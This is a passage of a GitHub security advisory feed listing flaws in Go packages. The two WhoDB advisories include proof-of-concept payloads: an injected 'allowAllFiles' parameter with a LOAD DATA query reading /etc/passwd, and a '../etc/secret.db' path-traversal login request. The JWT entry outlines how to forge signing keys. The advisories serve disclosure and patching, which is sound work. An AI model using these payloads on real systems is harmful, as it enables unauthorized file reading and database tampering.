<li><a href="https://github.com/kubernetes/kubernetes/issues/130016">https://github.com/kubernetes/kubernetes/issues/130016</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/13/1">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>
<li><a href="https://github.com/advisories/GHSA-jgfp-53c3-624w">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgfp-53c3-624w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T18:32:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/redhat-developer/gitops-operator] OpenShift GitOps Operator Namespace Isolation Break]]></title>
        <id>https://github.com/advisories/GHSA-58fx-7v9q-3g56</id>
        <link href="https://github.com/advisories/GHSA-58fx-7v9q-3g56"/>
        <updated>2025-02-13T15:08:58.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in openshift-gitops-operator-container. The openshift.io/cluster-monitoring label is applied to all namespaces that deploy an ArgoCD CR instance, allowing the namespace to create a rogue PrometheusRule. This issue can have adverse effects on the platform monitoring stack, as the rule is rolled out cluster-wide when the label is applied.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-13484">https://nvd.nist.gov/vuln/detail/CVE-2024-13484</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-13484">https://access.redhat.com/security/cve/CVE-2024-13484</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2269376">https://bugzilla.redhat.com/show_bug.cgi?id=2269376</a></li>
<li><a href="https://github.com/advisories/GHSA-58fx-7v9q-3g56">https://github.com/advisories/GHSA-58fx-7v9q-3g56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-58fx-7v9q-3g56</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-28T18:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v8] Potential Denial-of-Service condition leading to temporary disability in IBC transfers to the native chain]]></title>
        <id>https://github.com/advisories/GHSA-6fgm-x6ff-w78f</id>
        <link href="https://github.com/advisories/GHSA-6fgm-x6ff-w78f"/>
        <updated>2025-02-12T22:01:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Chains using affected versions of Packet Forward Middleware in their IBC Transfer stack are vulnerable to an attack in which there is a potential denial of service. This affects IBC transfers for any asset which is being transferred between another chain and its native chain.</p>
<p>We recommend upgrading as soon as possible.</p>
<p><strong>THIS IS A STATE BREAKING CHANGE</strong></p>
<h3 id="patches">Patches</h3>
<p>Versions <a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1">7.2.1</a> and <a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1">8.1.1</a> are patched.</p>
<h3 id="workarounds">Workarounds</h3>
<p>N/A</p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f">https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f</a></li>
<li><a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1</a></li>
<li><a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6fgm-x6ff-w78f">https://github.com/advisories/GHSA-6fgm-x6ff-w78f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fgm-x6ff-w78f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T22:01:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v7] Potential Denial-of-Service condition leading to temporary disability in IBC transfers to the native chain]]></title>
        <id>https://github.com/advisories/GHSA-6fgm-x6ff-w78f</id>
        <link href="https://github.com/advisories/GHSA-6fgm-x6ff-w78f"/>
        <updated>2025-02-12T22:01:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Chains using affected versions of Packet Forward Middleware in their IBC Transfer stack are vulnerable to an attack in which there is a potential denial of service. This affects IBC transfers for any asset which is being transferred between another chain and its native chain.</p>
<p>We recommend upgrading as soon as possible.</p>
<p><strong>THIS IS A STATE BREAKING CHANGE</strong></p>
<h3 id="patches">Patches</h3>
<p>Versions <a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1">7.2.1</a> and <a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1">8.1.1</a> are patched.</p>
<h3 id="workarounds">Workarounds</h3>
<p>N/A</p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f">https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f</a></li>
<li><a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1</a></li>
<li><a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6fgm-x6ff-w78f">https://github.com/advisories/GHSA-6fgm-x6ff-w78f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fgm-x6ff-w78f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T22:01:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.temporal.io/api] Unencrypted transmission in Temporal api-go library]]></title>
        <id>https://github.com/advisories/GHSA-q9w6-cwj4-gf4p</id>
        <link href="https://github.com/advisories/GHSA-q9w6-cwj4-gf4p"/>
        <updated>2025-02-12T19:37:53.000Z</updated>
        <content type="html"><![CDATA[<p>The Temporal api-go library prior to version 1.44.1 did not send <code>update response</code> information to Data Converter when the proxy package within the api-go module was used in a gRPC proxy prior to transmission. This resulted in&nbsp;information contained within the <code>update response</code> field not having Data Converter transformations (e.g. encryption) applied. This is an issue only when using the UpdateWorkflowExecution APIs (released on 13th January 2025)  with a proxy leveraging the api-go library before version 1.44.1.</p>
<p>Other data fields were correctly sent to Data Converter. This issue does not impact the Data Converter server. Data was encrypted in transit. Temporal Cloud services are not impacted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1243">https://nvd.nist.gov/vuln/detail/CVE-2025-1243</a></li>
<li><a href="https://github.com/temporalio/api-go/releases/tag/v1.44.1">https://github.com/temporalio/api-go/releases/tag/v1.44.1</a></li>
<li><a href="https://temporal.io/blog/announcing-a-new-operation-workflow-update">https://temporal.io/blog/announcing-a-new-operation-workflow-update</a></li>
<li><a href="https://github.com/temporalio/api-go/commit/dad8b169ada911d3778e070484d1ae78a58bd22b">https://github.com/temporalio/api-go/commit/dad8b169ada911d3778e070484d1ae78a58bd22b</a></li>
<li><a href="https://github.com/advisories/GHSA-q9w6-cwj4-gf4p">https://github.com/advisories/GHSA-q9w6-cwj4-gf4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9w6-cwj4-gf4p</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-12T03:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/microsoft/go-crypto-winnative] go-crypto-winnative BCryptGenerateSymmetricKey memory leak]]></title>
        <id>https://github.com/advisories/GHSA-29c6-3hcj-89cf</id>
        <link href="https://github.com/advisories/GHSA-29c6-3hcj-89cf"/>
        <updated>2025-02-12T19:21:02.000Z</updated>
        <content type="html"><![CDATA[<p>Calls to <code>cng.TLS1PRF</code> don't release the key handle, producing a small memory leak every time.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/go-crypto-winnative/security/advisories/GHSA-29c6-3hcj-89cf">https://github.com/microsoft/go-crypto-winnative/security/advisories/GHSA-29c6-3hcj-89cf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25199">https://nvd.nist.gov/vuln/detail/CVE-2025-25199</a></li>
<li><a href="https://github.com/microsoft/go-crypto-winnative/commit/f49c8e1379ea4b147d5bff1b3be5b0ff45792e41">https://github.com/microsoft/go-crypto-winnative/commit/f49c8e1379ea4b147d5bff1b3be5b0ff45792e41</a></li>
<li><a href="https://github.com/advisories/GHSA-29c6-3hcj-89cf">https://github.com/advisories/GHSA-29c6-3hcj-89cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-29c6-3hcj-89cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-12T19:20:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/distribution/distribution/v3] Distribution's token authentication allows to inject an untrusted signing key in a JWT]]></title>
        <id>https://github.com/advisories/GHSA-phw4-mc57-4hwc</id>
        <link href="https://github.com/advisories/GHSA-phw4-mc57-4hwc"/>
        <updated>2025-02-11T19:07:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Systems running registry version &gt; <code>3.0.0-beta.1</code> with token authentication enabled.</p>
<h3 id="patches">Patches</h3>
<p>Update to at least <code>v3.0.0-rc.3</code></p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no way to work around this issue without patching if your system requires token authentication.</p>
<h3 id="references">References</h3>
<p>The issue lies in how the JWK verification is performed. When a JWT contains a JWK header without a certificate chain, the code only checks if the KeyID (<code>kid</code>) matches one of the trusted keys, but doesn't verify that the actual key material matches.</p>
<p>Here's the problematic flow:</p>
<ol>
<li>An attacker generates their own key pair</li>
<li>They create a JWT and include their public key in the JWK header</li>
<li>They set the <code>kid</code> in the JWK to match one of the trusted keys' IDs (which they could potentially discover)</li>
<li>They sign the JWT with their private key</li>
<li>The registry only checks if the <code>kid</code> exists in the trusted keys map but then uses the attacker's public key from the JWK to verify the signature</li>
</ol>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/distribution/distribution/security/advisories/GHSA-phw4-mc57-4hwc">https://github.com/distribution/distribution/security/advisories/GHSA-phw4-mc57-4hwc</a></li>
<li><a href="https://github.com/distribution/distribution/commit/5ea9aa028db65ca5665f6af2c20ecf9dc34e5fcd">https://github.com/distribution/distribution/commit/5ea9aa028db65ca5665f6af2c20ecf9dc34e5fcd</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24976">https://nvd.nist.gov/vuln/detail/CVE-2025-24976</a></li>
<li><a href="https://github.com/advisories/GHSA-phw4-mc57-4hwc">https://github.com/advisories/GHSA-phw4-mc57-4hwc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-phw4-mc57-4hwc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-11T17:57:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/drakkan/sftpgo] SFTPGo has insufficient sanitization of user provided rsync command]]></title>
        <id>https://github.com/advisories/GHSA-vj7w-3m8c-6vpx</id>
        <link href="https://github.com/advisories/GHSA-vj7w-3m8c-6vpx"/>
        <updated>2025-02-10T17:01:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>SFTPGo supports execution of a defined set of commands via SSH. Besides a set of default commands some optional commands can be activated, one of them being <code>rsync</code>: it is disabled in the default configuration and it is limited to the local filesystem, it does not work with cloud/remote storage backends.</p>
<p>Due to missing sanitization of the client provided <code>rsync</code> command, an authenticated remote user can use some options of the rsync command to read or write files with the permissions of the SFTPGo server process. </p>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in version v2.6.5 by checking the client provided arguments.</p>
<p><a href="https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1">https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx">https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx</a></li>
<li><a href="https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1">https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24366">https://nvd.nist.gov/vuln/detail/CVE-2025-24366</a></li>
<li><a href="https://github.com/advisories/GHSA-vj7w-3m8c-6vpx">https://github.com/advisories/GHSA-vj7w-3m8c-6vpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vj7w-3m8c-6vpx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-07T20:31:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/drakkan/sftpgo/v2] SFTPGo has insufficient sanitization of user provided rsync command]]></title>
        <id>https://github.com/advisories/GHSA-vj7w-3m8c-6vpx</id>
        <link href="https://github.com/advisories/GHSA-vj7w-3m8c-6vpx"/>
        <updated>2025-02-10T17:01:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>SFTPGo supports execution of a defined set of commands via SSH. Besides a set of default commands some optional commands can be activated, one of them being <code>rsync</code>: it is disabled in the default configuration and it is limited to the local filesystem, it does not work with cloud/remote storage backends.</p>
<p>Due to missing sanitization of the client provided <code>rsync</code> command, an authenticated remote user can use some options of the rsync command to read or write files with the permissions of the SFTPGo server process. </p>
<h3 id="patches">Patches</h3>
<p>This issue was fixed in version v2.6.5 by checking the client provided arguments.</p>
<p><a href="https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1">https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx">https://github.com/drakkan/sftpgo/security/advisories/GHSA-vj7w-3m8c-6vpx</a></li>
<li><a href="https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1">https://github.com/drakkan/sftpgo/commit/b347ab6051f6c501da205c09315fe99cd1fa3ba1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24366">https://nvd.nist.gov/vuln/detail/CVE-2025-24366</a></li>
<li><a href="https://github.com/advisories/GHSA-vj7w-3m8c-6vpx">https://github.com/advisories/GHSA-vj7w-3m8c-6vpx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vj7w-3m8c-6vpx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-07T20:31:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/clidey/whodb/core] WhoDB allows parameter injection in DB connection URIs leading to local file inclusion]]></title>
        <id>https://github.com/advisories/GHSA-c7w4-9wv8-7x7c</id>
        <link href="https://github.com/advisories/GHSA-c7w4-9wv8-7x7c"/>
        <updated>2025-02-07T17:35:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The application is vulnerable to parameter injection in database connection strings, which allows an attacker to read local files on the machine the application is running on.</p>
<h3 id="details">Details</h3>
<p>The application uses string concatenation to build database connection URIs which are then passed to corresponding libraries responsible for setting up the database connections.</p>
<p>This string concatenation is done unsafely and without escaping or encoding the user input. This allows an user, in many cases, to inject arbitrary parameters into the URI string. These parameters can be potentially dangerous depending on the libraries used.</p>
<p>One of these dangerous parameters is <code>allowAllFiles</code> in the library <code>github.com/go-sql-driver/mysql</code>. Should this be set to <code>true</code>, the library enables running the <code>LOAD DATA LOCAL INFILE</code> query on any file on the host machine (in this case, the machine that WhoDB is running on). Source: <a href="https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128">https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128</a></p>
<p>By injecting <code>&amp;allowAllFiles=true</code> into the connection URI and connecting to any MySQL server (such as an attacker-controlled one), the attacker is able to read local files.</p>
<h3 id="poc">PoC</h3>
<p>As this vulnerability does not require sending requests manually and can all be done using the WhoDB UI, screenshots are provided instead of HTTP requests.</p>
<p>For this proof-of-concept, a clean instance of WhoDB and MySQL were set up using podman (docker is a suitable alternative):</p>
<pre><code>podman network create whodb-poc
podman run -d -p 8080:8080 --network whodb-poc docker.io/clidey/whodb
podman run -d --name mysql -e MYSQL_ROOT_PASSWORD=password --network whodb-poc docker.io/mysql:9
</code></pre>
<p>The attacker connects to the database via WhoDB. Note that in the <code>Loc</code> field, the string <code>&amp;allowAllFiles=true</code> is inserted:</p>
<p><img alt="2025-01-21-13-28-08" src="https://github.com/user-attachments/assets/28709707-97e4-4d26-b61c-5462db6dd43f"></p>
<p>After connecting, the attacker navigates to the scratchpad in <code>/scratchpad</code>.</p>
<p>The attacker first creates a demo table:</p>
<pre><code class="language-sql">CREATE TABLE poc (
    line TEXT
);
</code></pre>
<p>The attacker then enables loading files from the server side. For the sake of clarity, do note that while this is required, the file is not being read from the remote server where MySQL is running, but the local machine that WhoDB is running on.</p>
<pre><code class="language-sql">SET GLOBAL local_infile=1;
</code></pre>
<p>The attacker then uses the <code>LOAD DATA LOCAL INFILE</code> statement to read the contents of <code>/etc/passwd</code> (in this case from inside the container where WhoDB is running) into the previously created table:</p>
<pre><code class="language-sql">LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE poc
FIELDS TERMINATED BY '\0'
LINES TERMINATED BY '\n';
</code></pre>
<p>The attacker then navigates to the <code>poc</code> table in the <em>Tables</em> view and observes that the file has been read successfully:</p>
<p><img alt="2025-01-21-14-04-47" src="https://github.com/user-attachments/assets/c8f499ce-0d40-49ba-a2c6-fe2d12c677c5"></p>
<h3 id="impact">Impact</h3>
<p>While this proof-of-concept demonstrates local file inclusion, the root cause of the issue is the unsafe construction of database connection URIs from user input. Not all database connector libraries used in WhoDB were inspected; there may be libraries which allow for even more impactful parameters.</p>
<p>The attack requires no user authentication to WhoDB (only authentication to any database server, such as an attacker-controlled one) and no special configuration - the default configuration of the application is vulnerable.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/clidey/whodb/security/advisories/GHSA-c7w4-9wv8-7x7c">https://github.com/clidey/whodb/security/advisories/GHSA-c7w4-9wv8-7x7c</a></li>
<li><a href="https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1">https://github.com/clidey/whodb/commit/8d67b767e00552e5eba2b1537179b74bfa662ee1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24787">https://nvd.nist.gov/vuln/detail/CVE-2025-24787</a></li>
<li><a href="https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128">https://github.com/go-sql-driver/mysql/blob/7403860363ca112af503b4612568c3096fecb466/infile.go#L128</a></li>
<li><a href="https://github.com/advisories/GHSA-c7w4-9wv8-7x7c">https://github.com/advisories/GHSA-c7w4-9wv8-7x7c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c7w4-9wv8-7x7c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-06T19:58:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/clidey/whodb/core] WhoDB has a path traversal opening Sqlite3 database]]></title>
        <id>https://github.com/advisories/GHSA-9r4c-jwx3-3j76</id>
        <link href="https://github.com/advisories/GHSA-9r4c-jwx3-3j76"/>
        <updated>2025-02-07T17:35:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>While the application only displays Sqlite3 databases present in the directory <code>/db</code>, there is no path traversal prevention in place. This allows an unauthenticated attacker to open any Sqlite3 database present on the host machine that the application is running on.</p>
<h3 id="details">Details</h3>
<p>WhoDB allows users to connect to Sqlite3 databases. By default, the databases must be present in <code>/db/</code> (or alternatively <code>./tmp/</code> if development mode is enabled). Source: <a href="https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20</a></p>
<p>If no databases are present in the default directory, the UI indicates that the user is unable to open any databases:</p>
<p><img alt="2025-01-22-12-12-42" src="https://github.com/user-attachments/assets/98ffbcf6-907d-4f90-bf11-2c921b2d93b3"></p>
<p>The database file is an user-controlled value. This value is used in <code>.Join()</code> with the default directory, in order to get the full path of the database file to open. Source: <a href="https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26</a></p>
<p>No checks are performed whether the database file that is eventually opened actually resides in the default directory <code>/db</code>.</p>
<p>This allows an attacker to use path traversal (<code>../../</code>) in order to open any Sqlite3 database present on the system. </p>
<h3 id="poc">PoC</h3>
<p>Before running the container, an example Sqlite3 database with dummy "secret" data was created:</p>
<pre><code class="language-sh">DB_FILE=$(mktemp)
echo "CREATE TABLE secret_table (data TEXT); INSERT INTO secret_table VALUES ('secret data')" | sqlite3 "$DB_FILE"
</code></pre>
<p>The container was then created with nothing mounted into <code>/db</code>, and the dummy database mounted into <code>/etc/secret.db</code>:</p>
<pre><code class="language-sh">podman run -d -p 8080:8080 -v "$DB_FILE":/etc/secret.db docker.io/clidey/whodb
</code></pre>
<p>The attacker sends a HTTP request to determine whether the <code>secret.db</code> is accessible by setting the <code>Database</code> value to <code>../etc/secret.db</code>:</p>
<pre><code class="language-http">POST /api/query HTTP/1.1
Host: localhost:8080
content-type: application/json
...

{"operationName":"Login","variables":{"credentials":{"Type":"Sqlite3","Hostname":"","Database":"../etc/secret.db","Username":"","Password":"","Advanced":[]}},"query":"mutation Login($credentials: LoginCredentials!) {\n  Login(credentials: $credentials) {\n    Status\n    __typename\n  }\n}"}
</code></pre>
<p>The server response indicates that the database was successfully opened:</p>
<pre><code class="language-http">HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: Token=eyJUeXBlIjoiU3FsaXRlMyIsIkhvc3RuYW1lIjoiIiwiVXNlcm5hbWUiOiIiLCJQYXNzd29yZCI6IiIsIkRhdGFiYXNlIjoiLi4vZXRjL3NlY3JldC5kYiJ9; Path=/; Expires=Thu, 23 Jan 2025 10:35:43 GMT; HttpOnly
...

{"data":{"Login":{"Status":true,"__typename":"StatusResponse"}}}
</code></pre>
<p>The <code>Set-Cookie</code> <code>Token</code> value is simply a Base64-encoded string with a JSON payload containing the connection details:</p>
<pre><code class="language-json">{
  "Type": "Sqlite3",
  "Hostname": "",
  "Username": "",
  "Password": "",
  "Database": "../etc/secret.db"
}
</code></pre>
<p>The attacker may set this cookie in the browser manually (alongside corresponding profiles in Local Storage) in order to open this database in the WhoDB application graphically. An easy way to perform this is by using a HTTP proxy such as Burp Suite, intercepting the login request and swapping the <code>Database</code> value to <code>../etc/secret.db</code>.</p>
<p>Doing so, the attacker can then browse the database, its tables and the data within:</p>
<p><img alt="2025-01-22-12-36-25" src="https://github.com/user-attachments/assets/c28f1273-7a3c-49e8-bb73-d08a09c7521d"></p>
<p>The attacker may also insert or modify data using either the buttons presented in the UI or the <em>Scratchpad</em> functionality. In this proof-of-concept, the attacker inserts a new row using the <em>Add Row</em> button:</p>
<p><img alt="2025-01-22-12-36-49" src="https://github.com/user-attachments/assets/dbd86beb-9969-464c-9a28-a19d470d0f52"></p>
<h3 id="impact">Impact</h3>
<p>Allows an unauthenticated attacker to open and read any Sqlite3 databases present on the system WhoDB is running on. If WhoDB has write permissions for the database file, the attacker is also able to modify the opened database.</p>
<p>The attacker is unable to create new databases; however, files which already exist but have no content (0-length files) may be opened and modified as fresh databases.</p>
<h3 id="recommendations">Recommendations</h3>
<p>Before attempting to open the database, resolve and normalize the path to the database and check whether it is in the default directory. If not, present the user with an error.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76">https://github.com/clidey/whodb/security/advisories/GHSA-9r4c-jwx3-3j76</a></li>
<li><a href="https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc">https://github.com/clidey/whodb/commit/547336ac73c8d17929c18c3941c0d5b0099753cc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24786">https://nvd.nist.gov/vuln/detail/CVE-2025-24786</a></li>
<li><a href="https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L14-L20</a></li>
<li><a href="https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26">https://github.com/clidey/whodb/blob/ba6eb81d0ca40baead74bca58b2567166999d6a6/core/src/plugins/sqlite3/db.go#L26</a></li>
<li><a href="https://github.com/advisories/GHSA-9r4c-jwx3-3j76">https://github.com/advisories/GHSA-9r4c-jwx3-3j76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9r4c-jwx3-3j76</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-02-06T19:58:24.000Z</published>
    </entry>
</feed>